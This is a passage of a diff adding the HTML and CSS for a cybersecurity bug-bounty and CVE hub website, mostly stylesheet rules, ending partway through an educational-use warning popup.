@@ -1,0 +1,772 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>NW CyberSafeHub - Bug Bounty &amp; Security Hub</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Syne:wght@400;600;700;800&amp;family=DM+Sans:wght@300;400;500&amp;display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --bg:#040a0f;--bg2:#070e16;--bg3:#0b1520;
+  --surface:#0f1e2e;--surface2:#162436;
+  --border:#1a3048;
+  --accent:#00d4ff;--accent2:#ff2d78;--accent3:#7fff00;--accent4:#ffa500;
+  --text:#e8f4fd;--text2:#8ba8bf;--text3:#4a6a80;
+  --red:#ff2d78;--green:#7fff00;--yellow:#ffc93c;--purple:#a855f7;
+  --font-head:'Syne',sans-serif;
+  --font-mono:'Space Mono',monospace;
+  --font-body:'DM Sans',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:var(--font-body);min-height:100vh;overflow-x:hidden;}
+body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,255,0.01) 2px,rgba(0,212,255,0.01) 4px);pointer-events:none;z-index:0;}
+body::after{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background-image:linear-gradient(rgba(0,212,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0;}
+#navbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(4,10,15,0.97);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);}
+.nav-inner{max-width:1400px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;height:60px;padding:0 1.5rem;}
+.nav-logo{font-family:var(--font-head);font-size:1.3rem;font-weight:800;color:var(--accent);text-decoration:none;letter-spacing:2px;display:flex;align-items:center;gap:8px;}
+.nav-logo em{color:var(--accent2);font-style:normal;}
+.logo-box{width:30px;height:30px;border:2px solid var(--accent);border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:.65rem;font-family:var(--font-mono);color:var(--accent);}
+.nav-links{display:flex;gap:3px;align-items:center;flex-wrap:wrap;}
+.nav-links button{background:none;border:1px solid transparent;color:var(--text2);font-family:var(--font-mono);font-size:.72rem;letter-spacing:1px;padding:6px 11px;border-radius:4px;cursor:pointer;transition:all .2s;text-transform:uppercase;}
+.nav-links button:hover{color:var(--accent);border-color:var(--border);background:var(--surface);}
+.btn-admin{background:linear-gradient(135deg,var(--accent2),#c41762) !important;color:#fff !important;border:none !important;}
+.btn-submit{background:linear-gradient(135deg,var(--accent),#0084ff) !important;color:var(--bg) !important;border:none !important;font-weight:700 !important;}
+.hamburger{display:none;background:none;border:1px solid var(--border);color:var(--text);padding:7px 10px;border-radius:4px;cursor:pointer;font-size:1rem;}
+#hero{position:relative;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;z-index:1;padding-top:60px;}
+.orb{position:absolute;border-radius:50%;filter:blur(90px);pointer-events:none;opacity:.1;}
+.orb1{width:500px;height:500px;background:var(--accent);top:-200px;left:-200px;}
+.orb2{width:400px;height:400px;background:var(--accent2);bottom:-100px;right:-100px;}
+.orb3{width:300px;height:300px;background:var(--purple);top:50%;left:50%;transform:translate(-50%,-50%);}
+.hero-content{text-align:center;max-width:900px;padding:4rem 1.5rem;position:relative;z-index:2;}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(0,212,255,.1);border:1px solid rgba(0,212,255,.3);border-radius:50px;padding:6px 20px;font-size:.7rem;font-family:var(--font-mono);color:var(--accent);letter-spacing:2px;margin-bottom:1.5rem;}
+.bdot{width:6px;height:6px;background:var(--accent3);border-radius:50%;animation:blink 1.2s infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.2;}}
+.hero-title{font-family:var(--font-head);font-size:clamp(2.2rem,7vw,5rem);font-weight:800;line-height:1.05;margin-bottom:1.5rem;}
+.hero-title .l1{color:var(--text);}
+.hero-title .l2{background:linear-gradient(90deg,var(--accent),var(--purple),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.type-line{font-family:var(--font-mono);font-size:.85rem;color:var(--accent);letter-spacing:2px;margin-bottom:1rem;min-height:1.4rem;}
+.hero-sub{font-size:1rem;color:var(--text2);line-height:1.7;max-width:580px;margin:0 auto 2.5rem;}
+.hero-btns{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;}
+.btn-prim{background:linear-gradient(135deg,var(--accent),#0084ff);color:var(--bg);padding:13px 30px;border:none;border-radius:6px;font-family:var(--font-mono);font-size:.8rem;letter-spacing:1px;cursor:pointer;transition:all .3s;text-transform:uppercase;font-weight:700;}
+.btn-prim:hover{transform:translateY(-2px);box-shadow:0 0 20px rgba(0,212,255,.4);}
+.btn-out{background:transparent;color:var(--accent);padding:13px 30px;border:1px solid var(--accent);border-radius:6px;font-family:var(--font-mono);font-size:.8rem;letter-spacing:1px;cursor:pointer;transition:all .3s;text-transform:uppercase;}
+.btn-out:hover{background:rgba(0,212,255,.1);transform:translateY(-2px);}
+.hero-stats{display:flex;gap:3rem;justify-content:center;margin-top:3.5rem;flex-wrap:wrap;}
+.stat-n{font-family:var(--font-head);font-size:2rem;font-weight:800;color:var(--accent);}
+.stat-l{font-size:.7rem;color:var(--text3);font-family:var(--font-mono);letter-spacing:2px;text-transform:uppercase;margin-top:4px;}
+section{position:relative;z-index:1;padding:4rem 1.5rem;}
+.container{max-width:1400px;margin:0 auto;}
+.sec-hdr{text-align:center;margin-bottom:3.5rem;}
+.sec-tag{display:inline-block;font-family:var(--font-mono);font-size:.68rem;letter-spacing:3px;text-transform:uppercase;color:var(--accent);background:rgba(0,212,255,.1);border:1px solid rgba(0,212,255,.2);padding:4px 14px;border-radius:3px;margin-bottom:1rem;}
+.sec-title{font-family:var(--font-head);font-size:clamp(1.6rem,4vw,2.8rem);font-weight:800;color:var(--text);margin-bottom:.8rem;}
+.sec-sub{color:var(--text2);font-size:.95rem;max-width:560px;margin:0 auto;line-height:1.7;}
+.cards-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(290px,1fr));gap:1.5rem;}
+.c-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.8rem;cursor:pointer;transition:all .3s;position:relative;overflow:hidden;}
+.c-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--purple));transform:scaleX(0);transform-origin:left;transition:transform .3s;}
+.c-card:hover::before{transform:scaleX(1);}
+.c-card:hover{border-color:rgba(0,212,255,.3);transform:translateY(-4px);box-shadow:0 20px 40px rgba(0,0,0,.4);}
+.c-icon{width:50px;height:50px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.4rem;margin-bottom:1rem;}
+.c-card h3{font-family:var(--font-head);font-size:1.1rem;font-weight:700;color:var(--text);margin-bottom:.5rem;}
+.c-card p{font-size:.85rem;color:var(--text2);line-height:1.6;}
+.c-arrow{position:absolute;top:1.4rem;right:1.4rem;color:var(--text3);font-size:1.1rem;transition:transform .2s;}
+.c-card:hover .c-arrow{transform:translate(3px,-3px);color:var(--accent);}
+.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.88);z-index:2000;backdrop-filter:blur(8px);overflow-y:auto;padding:1.5rem;}
+.overlay.on{display:block;}
+.panel{background:var(--bg2);border:1px solid var(--border);border-radius:16px;width:100%;max-width:1100px;margin:0 auto;position:relative;animation:sup .3s ease;}
+@keyframes sup{from{transform:translateY(28px);opacity:0;}to{transform:translateY(0);opacity:1;}}
+.panel-x{position:absolute;top:1rem;right:1rem;background:var(--surface);border:1px solid var(--border);color:var(--text2);width:34px;height:34px;border-radius:6px;cursor:pointer;font-size:1rem;display:flex;align-items:center;justify-content:center;z-index:10;transition:all .2s;}
+.panel-x:hover{background:var(--accent2);color:#fff;border-color:var(--accent2);}
+.panel-hdr{padding:1.8rem 1.8rem 0;border-bottom:1px solid var(--border);padding-bottom:1.2rem;}
+.panel-ttl{font-family:var(--font-head);font-size:1.6rem;font-weight:800;color:var(--text);}
+.panel-sub{color:var(--text2);font-size:.85rem;margin-top:.3rem;}
+.panel-body{padding:1.8rem;}
+.os-sel{display:flex;gap:.8rem;margin-bottom:2rem;flex-wrap:wrap;}
+.os-btn{display:flex;flex-direction:column;align-items:center;gap:6px;padding:1rem 1.4rem;border:1px solid var(--border);border-radius:10px;background:var(--surface);cursor:pointer;transition:all .2s;font-family:var(--font-mono);font-size:.68rem;letter-spacing:1px;text-transform:uppercase;color:var(--text2);min-width:90px;}
+.os-btn.on,.os-btn:hover{border-color:var(--accent);background:rgba(0,212,255,.07);color:var(--accent);}
+.os-i{font-size:1.8rem;}
+.tools-g{display:grid;grid-template-columns:repeat(auto-fill,minmax(310px,1fr));gap:1.2rem;}
+.tool-c{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;transition:all .2s;}
+.tool-c:hover{border-color:rgba(0,212,255,.3);transform:translateY(-2px);}
+.tool-h{padding:1rem 1.2rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;}
+.tool-ic{width:38px;height:38px;border-radius:7px;background:var(--bg3);display:flex;align-items:center;justify-content:center;font-size:1rem;flex-shrink:0;}
+.tool-nm{font-family:var(--font-head);font-size:.95rem;font-weight:700;color:var(--text);}
+.tool-ct{font-size:.65rem;font-family:var(--font-mono);letter-spacing:1px;text-transform:uppercase;}
+.ct-recon{color:var(--accent);}
+.ct-exploit{color:var(--accent2);}
+.ct-scan{color:var(--yellow);}
+.ct-web{color:var(--purple);}
+.ct-network{color:var(--green);}
+.ct-password{color:var(--accent4);}
+.ct-forensics{color:#ff6b9d;}
+.tool-b{padding:1.2rem;}
+.tool-desc{font-size:.82rem;color:var(--text2);line-height:1.6;margin-bottom:.8rem;}
+.code-box{background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:.8rem;margin-bottom:.6rem;}
+.code-lbl{font-family:var(--font-mono);font-size:.6rem;letter-spacing:2px;text-transform:uppercase;color:var(--text3);margin-bottom:.4rem;}
+.code-txt{font-family:var(--font-mono);font-size:.75rem;color:var(--accent3);white-space:pre-wrap;word-break:break-all;}
+.tags{display:flex;flex-wrap:wrap;gap:5px;margin-top:.8rem;}
+.tg{font-size:.6rem;padding:2px 8px;border-radius:3px;font-family:var(--font-mono);letter-spacing:1px;text-transform:uppercase;border:1px solid;}
+.tg-free{color:var(--green);border-color:rgba(127,255,0,.3);background:rgba(127,255,0,.05);}
+.tg-paid{color:var(--yellow);border-color:rgba(255,201,60,.3);background:rgba(255,201,60,.05);}
+.tg-opensource{color:var(--accent);border-color:rgba(0,212,255,.3);background:rgba(0,212,255,.05);}
+.tg-kali{color:#557cd6;border-color:rgba(85,124,214,.3);background:rgba(85,124,214,.05);}
+.tg-linux{color:#ff9e2c;border-color:rgba(255,158,44,.3);background:rgba(255,158,44,.05);}
+.tg-windows{color:#00b4d8;border-color:rgba(0,180,216,.3);background:rgba(0,180,216,.05);}
+.tg-mac{color:#adb5bd;border-color:rgba(173,181,189,.3);background:rgba(173,181,189,.05);}
+.tg-android{color:#a4c639;border-color:rgba(164,198,57,.3);background:rgba(164,198,57,.05);}
+.news-g{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:1.2rem;}
+.news-c{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.3rem;transition:all .2s;}
+.news-c:hover{border-color:rgba(0,212,255,.3);transform:translateY(-2px);}
+.news-meta{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:.8rem;}
+.news-dt{font-family:var(--font-mono);font-size:.65rem;color:var(--text3);background:var(--bg3);padding:3px 8px;border-radius:3px;}
+.nbadge{font-family:var(--font-mono);font-size:.6rem;letter-spacing:1px;text-transform:uppercase;padding:2px 8px;border-radius:3px;border:1px solid;}
+.nb-crit{color:var(--red);border-color:rgba(255,45,120,.3);background:rgba(255,45,120,.08);}
+.nb-high{color:var(--yellow);border-color:rgba(255,201,60,.3);background:rgba(255,201,60,.08);}
+.nb-med{color:var(--accent);border-color:rgba(0,212,255,.3);background:rgba(0,212,255,.08);}
+.nb-info{color:var(--purple);border-color:rgba(168,85,247,.3);background:rgba(168,85,247,.08);}
+.news-ttl{font-family:var(--font-head);font-size:.95rem;font-weight:700;color:var(--text);margin-bottom:.6rem;line-height:1.4;}
+.news-sum{font-size:.82rem;color:var(--text2);line-height:1.6;}
+.news-src{display:flex;align-items:center;gap:5px;margin-top:.8rem;font-size:.72rem;color:var(--text3);}
+.sdot{width:5px;height:5px;border-radius:50%;background:var(--accent);flex-shrink:0;}
+.cve-search-row{display:flex;gap:.8rem;margin-bottom:1.5rem;flex-wrap:wrap;}
+.cve-inp{flex:1;min-width:200px;background:var(--surface);border:1px solid var(--border);border-radius:7px;padding:.75rem 1rem;color:var(--text);font-family:var(--font-mono);font-size:.85rem;}
+.cve-inp:focus{outline:none;border-color:var(--accent);}
+.cve-srch-btn{background:linear-gradient(135deg,var(--accent),#0084ff);color:var(--bg);padding:.75rem 1.5rem;border:none;border-radius:7px;font-family:var(--font-mono);cursor:pointer;font-weight:700;letter-spacing:1px;text-transform:uppercase;}
+.cve-filters{display:flex;gap:.6rem;margin-bottom:1.5rem;flex-wrap:wrap;}
+.cve-fb{font-family:var(--font-mono);font-size:.65rem;letter-spacing:1px;text-transform:uppercase;padding:5px 12px;border-radius:4px;border:1px solid var(--border);background:var(--surface);color:var(--text2);cursor:pointer;transition:all .2s;}
+.cve-fb.on,.cve-fb:hover{border-color:var(--accent);color:var(--accent);background:rgba(0,212,255,.05);}
+.cve-list{display:flex;flex-direction:column;gap:.8rem;}
+.cve-row{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;cursor:pointer;transition:all .2s;}
+.cve-row:hover{border-color:rgba(0,212,255,.3);}
+.cve-rhdr{padding:1rem 1.3rem;display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;}
+.cve-id{font-family:var(--font-mono);font-size:.9rem;font-weight:700;color:var(--accent);}
+.cvss-b{padding:3px 10px;border-radius:4px;font-family:var(--font-mono);font-size:.7rem;font-weight:700;}
+.cvss-crit{background:rgba(255,45,120,.15);color:var(--red);border:1px solid rgba(255,45,120,.3);}
+.cvss-high{background:rgba(255,200,60,.15);color:var(--yellow);border:1px solid rgba(255,200,60,.3);}
+.cvss-med{background:rgba(0,212,255,.15);color:var(--accent);border:1px solid rgba(0,212,255,.3);}
+.cve-rtitle{font-size:.85rem;color:var(--text);flex:1;}
+.cve-rdate{font-family:var(--font-mono);font-size:.65rem;color:var(--text3);margin-left:auto;}
+.cve-detail{display:none;padding:1.3rem;border-top:1px solid var(--border);background:var(--bg3);}
+.cve-detail.open{display:block;}
+.cve-dgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:.8rem;margin-bottom:1.2rem;}
+.cve-di label{font-family:var(--font-mono);font-size:.6rem;letter-spacing:2px;text-transform:uppercase;color:var(--text3);display:block;margin-bottom:.2rem;}
+.cve-di span{font-size:.85rem;color:var(--text);}
+.cve-stitle{font-family:var(--font-head);font-size:.95rem;font-weight:700;color:var(--text);margin:1.2rem 0 .6rem;display:flex;align-items:center;gap:7px;}
+.cve-stitle::before{content:'';width:3px;height:14px;background:var(--accent);border-radius:2px;flex-shrink:0;}
+.edu-warn{display:flex;align-items:flex-start;gap:10px;background:rgba(255,45,120,.07);border:1px solid rgba(255,45,120,.25);border-radius:7px;padding:.9rem 1rem;margin-bottom:1.2rem;}
+.ew-icon{font-size:1.1rem;flex-shrink:0;}
+.ew-txt{font-size:.8rem;color:var(--text2);line-height:1.6;}
+.ew-txt strong{color:var(--red);}
+.expl-block{background:var(--bg);border:1px solid var(--border);border-radius:7px;padding:1rem;font-family:var(--font-mono);font-size:.75rem;color:var(--green);line-height:1.8;overflow-x:auto;white-space:pre-wrap;word-break:break-word;}
+.ref-row{display:flex;gap:.5rem;flex-wrap:wrap;margin-top:.8rem;}
+.ref-a{font-family:var(--font-mono);font-size:.65rem;color:var(--accent);border:1px solid rgba(0,212,255,.25);padding:3px 10px;border-radius:4px;text-decoration:none;transition:all .2s;}
+.ref-a:hover{background:rgba(0,212,255,.1);}
+.dev-sel{display:flex;gap:.8rem;margin-bottom:2rem;flex-wrap:wrap;}
+.dev-btn{display:flex;flex-direction:column;align-items:center;gap:6px;padding:1.2rem 1.6rem;border:1px solid var(--border);border-radius:10px;background:var(--surface);cursor:pointer;transition:all .2s;font-family:var(--font-mono);font-size:.65rem;letter-spacing:1px;text-transform:uppercase;color:var(--text2);}
+.dev-btn.on,.dev-btn:hover{border-color:var(--accent3);background:rgba(127,255,0,.05);color:var(--green);}
+.dev-ic{font-size:2rem;}
+.prev-g{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:1.2rem;}
+.prev-c{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
+.prev-ch{padding:1rem 1.2rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;}
+.atk-ic{width:42px;height:42px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.1rem;flex-shrink:0;}
+.prev-cb{padding:1.2rem;}
+.prev-c h3{font-family:var(--font-head);font-size:.95rem;font-weight:700;color:var(--text);}
+.atk-type{font-family:var(--font-mono);font-size:.65rem;letter-spacing:1px;text-transform:uppercase;color:var(--accent2);margin-top:2px;}
+.sev-bar{display:flex;align-items:center;gap:8px;margin-top:.8rem;}
+.sev-lbl{font-family:var(--font-mono);font-size:.6rem;letter-spacing:1px;text-transform:uppercase;color:var(--text3);width:55px;}
+.sev-track{flex:1;height:3px;background:var(--border);border-radius:2px;overflow:hidden;}
+.sev-fill{height:100%;border-radius:2px;}
+.prev-list{list-style:none;margin-top:.8rem;}
+.prev-list li{font-size:.82rem;color:var(--text2);line-height:1.5;padding:.35rem 0 .35rem 1.3rem;position:relative;border-bottom:1px solid rgba(255,255,255,.03);}
+.prev-list li::before{content:'&#9658;';position:absolute;left:0;color:var(--accent3);font-size:.5rem;top:.6rem;}
+.notes-layout{display:grid;grid-template-columns:240px 1fr;gap:1.5rem;}
+.notes-sb{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.2rem;height:fit-content;position:sticky;top:70px;}
+.notes-sb h4{font-family:var(--font-head);font-size:.9rem;font-weight:700;color:var(--text);margin-bottom:.8rem;padding-bottom:.6rem;border-bottom:1px solid var(--border);}
+.ncat-btn{width:100%;text-align:left;background:none;border:none;color:var(--text2);font-family:var(--font-body);font-size:.83rem;padding:.5rem .7rem;border-radius:5px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:space-between;margin-bottom:3px;}
+.ncat-btn:hover,.ncat-btn.on{background:rgba(0,212,255,.07);color:var(--accent);}
+.ncat-cnt{font-family:var(--font-mono);font-size:.6rem;background:var(--bg3);border:1px solid var(--border);padding:1px 6px;border-radius:8px;color:var(--text3);}
+.notes-srch{display:flex;gap:.5rem;margin-bottom:1.2rem;}
+.notes-srch input{flex:1;background:var(--surface);border:1px solid var(--border);border-radius:7px;padding:.7rem .9rem;color:var(--text);font-family:var(--font-body);font-size:.85rem;}
+.notes-srch input:focus{outline:none;border-color:var(--accent);}
+.notes-srch button{background:var(--accent);color:var(--bg);border:none;border-radius:7px;padding:.7rem 1rem;cursor:pointer;}
+.notes-grid{display:flex;flex-direction:column;gap:.8rem;}
+.note-c{background:var(--surface);border:1px solid var(--border);border-radius:10px;cursor:pointer;overflow:hidden;transition:all .2s;}
+.note-c:hover{border-color:rgba(168,85,247,.4);}
+.note-ch{padding:1rem 1.2rem;display:flex;align-items:flex-start;gap:10px;}
+.note-ic{width:40px;height:40px;border-radius:7px;background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.2);display:flex;align-items:center;justify-content:center;font-size:1rem;flex-shrink:0;}
+.note-c h4{font-family:var(--font-head);font-size:.95rem;font-weight:700;color:var(--text);}
+.note-c p{font-size:.8rem;color:var(--text2);line-height:1.5;margin-top:.2rem;}
+.note-meta{display:flex;gap:.5rem;flex-wrap:wrap;padding:.6rem 1.2rem;border-top:1px solid var(--border);background:var(--bg3);}
+.nlevel{font-family:var(--font-mono);font-size:.6rem;letter-spacing:1px;text-transform:uppercase;padding:2px 8px;border-radius:3px;}
+.lvl-beg{color:var(--green);background:rgba(127,255,0,.07);border:1px solid rgba(127,255,0,.2);}
+.lvl-int{color:var(--yellow);background:rgba(255,200,60,.07);border:1px solid rgba(255,200,60,.2);}
+.lvl-adv{color:var(--red);background:rgba(255,45,120,.07);border:1px solid rgba(255,45,120,.2);}
+.note-dur{font-family:var(--font-mono);font-size:.6rem;color:var(--text3);align-self:center;}
+.note-body{display:none;padding:1.2rem;border-top:1px solid var(--border);}
+.note-body.open{display:block;}
+.note-body h5{font-family:var(--font-head);font-size:.9rem;font-weight:700;color:var(--text);margin-top:1rem;margin-bottom:.5rem;}
+.note-body p{font-size:.82rem;color:var(--text2);line-height:1.7;margin-bottom:.6rem;}
+.note-body ul{list-style:none;margin:.6rem 0;}
+.note-body ul li{font-size:.82rem;color:var(--text2);padding:.25rem 0 .25rem 1.2rem;position:relative;}
+.note-body ul li::before{content:'&#10097;';position:absolute;left:0;color:var(--purple);font-size:1rem;line-height:1;}
+.ncode{background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:.9rem;font-family:var(--font-mono);font-size:.75rem;color:var(--accent3);line-height:1.7;margin:.6rem 0;overflow-x:auto;white-space:pre-wrap;word-break:break-word;}
+.upload-wrap{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:1.8rem;max-width:680px;margin:0 auto;}
+.step-dots{display:flex;gap:.4rem;margin-bottom:1.8rem;}
+.sdot2{width:7px;height:7px;border-radius:50%;background:var(--border);transition:all .3s;}
+.sdot2.done{background:var(--accent3);}
+.sdot2.on{background:var(--accent);width:22px;border-radius:4px;}
+.f-step{display:none;}
+.f-step.on{display:block;}
+.section-pick{display:grid;grid-template-columns:1fr 1fr;gap:.8rem;}
+.sp-btn{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.3rem;text-align:center;cursor:pointer;transition:all .2s;}
+.sp-btn:hover{border-color:var(--accent);background:rgba(0,212,255,.05);}
+.sp-btn .sp-ic{font-size:1.8rem;margin-bottom:.4rem;}
+.sp-btn .sp-nm{font-family:var(--font-head);font-weight:700;color:var(--text);font-size:.9rem;}
+.sp-btn .sp-sub{font-size:.75rem;color:var(--text2);margin-top:.2rem;}
+.f-grp{margin-bottom:1rem;}
+.f-grp label{display:block;font-family:var(--font-mono);font-size:.65rem;letter-spacing:2px;text-transform:uppercase;color:var(--text3);margin-bottom:.4rem;}
+.f-inp,.f-sel,.f-ta{width:100%;background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:.75rem .9rem;color:var(--text);font-family:var(--font-body);font-size:.88rem;transition:border-color .2s;}
+.f-inp:focus,.f-sel:focus,.f-ta:focus{outline:none;border-color:var(--accent);}
+.f-ta{min-height:110px;resize:vertical;}
+.f-sel{appearance:none;cursor:pointer;}
+.f-btns{display:flex;gap:.8rem;margin-top:1.2rem;}
+.btn-next{background:linear-gradient(135deg,var(--accent),#0084ff);color:var(--bg);padding:.75rem 1.8rem;border:none;border-radius:7px;font-family:var(--font-mono);cursor:pointer;font-weight:700;text-transform:uppercase;letter-spacing:1px;}
+.btn-back{background:var(--surface);color:var(--text2);padding:.75rem 1.3rem;border:1px solid var(--border);border-radius:7px;font-family:var(--font-mono);cursor:pointer;text-transform:uppercase;letter-spacing:1px;}
+.pend-list{display:flex;flex-direction:column;gap:.8rem;}
+.pend-c{background:var(--surface);border:1px solid var(--border);border-radius:9px;padding:1rem 1.2rem;display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;}
+.pend-b{font-family:var(--font-mono);font-size:.6rem;letter-spacing:1px;text-transform:uppercase;padding:3px 10px;border-radius:3px;background:rgba(255,200,60,.1);border:1px solid rgba(255,200,60,.3);color:var(--yellow);}
+.pend-ttl{font-size:.88rem;color:var(--text);}
+.pend-auth{font-size:.75rem;color:var(--text3);}
+.apr-btn{background:var(--green);color:var(--bg);border:none;padding:5px 12px;border-radius:5px;font-family:var(--font-mono);font-size:.68rem;cursor:pointer;font-weight:700;margin-left:auto;}
+.rej-btn{background:var(--accent2);color:#fff;border:none;padding:5px 12px;border-radius:5px;font-family:var(--font-mono);font-size:.68rem;cursor:pointer;font-weight:700;}
+.admin-tabs{display:flex;gap:.4rem;margin-bottom:1.5rem;border-bottom:1px solid var(--border);padding-bottom:.8rem;flex-wrap:wrap;}
+.atab{font-family:var(--font-mono);font-size:.7rem;letter-spacing:1px;text-transform:uppercase;padding:.5rem 1rem;border-radius:5px;border:1px solid transparent;color:var(--text2);cursor:pointer;background:none;transition:all .2s;}
+.atab.on{background:rgba(0,212,255,.1);border-color:rgba(0,212,255,.3);color:var(--accent);}
+.atab-body{display:none;}
+.atab-body.on{display:block;}
+.stat-row{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:.8rem;margin-bottom:1.5rem;}
+.stat-box{background:var(--surface);border:1px solid var(--border);border-radius:9px;padding:1rem;text-align:center;}
+.stat-n2{font-family:var(--font-head);font-size:1.7rem;font-weight:800;color:var(--accent);}
+.stat-l2{font-family:var(--font-mono);font-size:.6rem;letter-spacing:2px;text-transform:uppercase;color:var(--text3);margin-top:3px;}
+.edu-pop{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);z-index:9999;align-items:center;justify-content:center;backdrop-filter:blur(12px);}
+.edu-pop.on{display:flex;}
+.pop-box{background:var(--surface);border:1px solid rgba(255,45,120,.4);border-radius:14px;padding:2.2rem;max-width:500px;width:90%;text-align:center;animation:popIn .4s cubic-bezier(.175,.885,.32,1.275);}
+@keyframes popIn{from{transform:scale(.7);opacity:0;}to{transform:scale(1);opacity:1;}}
+.pop-ic{font-size:2.8rem;margin-bottom:.8rem;display:block;}
+.pop-ttl{font-family:var(--font-head);font-size:1.4rem;font-weight:800;color:var(--red);margin-bottom:.8rem;}
+.pop-txt{font-size:.85rem;color:var(--text2);line-height:1.7;margin-bottom:1.2rem;}
+.pop-cd{font-family:var(--font-mono);font-size:.75rem;color:var(--text3);margin-bottom:1.2rem;}
+.pop-bar{height:3px;background:var(--border);border-radius:2px;margin-bottom:1rem;overflow:hidden;}
+.pop-fill{height:100%;background:linear-gradient(90deg,var(--red),var(--yellow));border-radius:2px;transition:width .1s linear;}
+.pop-agree{background:linear-gradient(135deg,var(--accent2),#c41762);color:#fff;padding:11px 2rem;border:none;border-radius:7px;font-family:var(--font-mono);font-size:.8rem;letter-spacing:1px;cursor:pointer;font-weight:700;text-transform:uppercase;transition:all .2s;}
+.pop-agree:hover:not(:disabled){transform:translateY(-2px);}
+.pop-agree:disabled{opacity:.5;cursor:not-allowed;}
+footer{background:var(--bg2);border-top:1px solid var(--border);padding:2.5rem 1.5rem;position:relative;z-index:1;}
+.foot-inner{max-width:1400px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1.8rem;}
+.foot-brand .flogo{font-family:var(--font-head);font-size:1.2rem;font-weight:800;color:var(--accent);}
+.foot-brand p{font-size:.82rem;color:var(--text3);margin-top:.4rem;line-height:1.6;}
+.foot-col h5{font-family:var(--font-head);font-size:.85rem;font-weight:700;color:var(--text);margin-bottom:.8rem;}
+.foot-col ul{list-style:none;}
+.foot-col ul li{margin-bottom:.4rem;}
+.foot-col ul li a{font-size:.82rem;color:var(--text3);text-decoration:none;transition:color .2s;}
+.foot-col ul li a:hover{color:var(--accent);}
+.foot-bot{text-align:center;padding-top:1.5rem;margin-top:1.5rem;border-top:1px solid var(--border);font-family:var(--font-mono);font-size:.65rem;color:var(--text3);}
+.div-line{height:1px;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+.particle{position:absolute;border-radius:50%;pointer-events:none;animation:floatup linear infinite;}
+@keyframes floatup{0%{transform:translateY(100vh) rotate(0deg);opacity:0;}10%{opacity:.7;}90%{opacity:.7;}100%{transform:translateY(-100px) rotate(720deg);opacity:0;}}
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+@media(max-width:800px){.notes-layout{grid-template-columns:1fr;}.notes-sb{position:static;}}
+@media(max-width:768px){.nav-links{display:none;}.nav-links.open{display:flex;flex-direction:column;position:fixed;top:60px;left:0;right:0;background:rgba(4,10,15,.98);padding:1.2rem;border-bottom:1px solid var(--border);z-index:999;}.hamburger{display:block;}.section-pick{grid-template-columns:1fr;}section{padding:3rem 1rem;}}
+</style>
+</head>
+<body>
+
+<!-- EDU WARNING POPUP -->
+<div class="edu-pop" id="eduPop">
+  <div class="pop-box">
+    <span class="pop-ic">&#9888;&#65039;</span>
+    <div class="pop-ttl">EDUCATIONAL USE ONLY</div>
+    <div class="pop-bar"><div class="pop-fill" id="popFill" style="width:100%"></div></div>
+    <div class="pop-txt">
+      All CVE details, exploit techniques, and tool information on this platform are provided
+      <strong>strictly for educational and research purposes only.</strong><br/><br/>
+      Unauthorized use of vulnerabilities against systems you do not own or have explicit written
+      permission to test is <strong>ILLEGAL</strong> and punishable under the Computer Fraud and
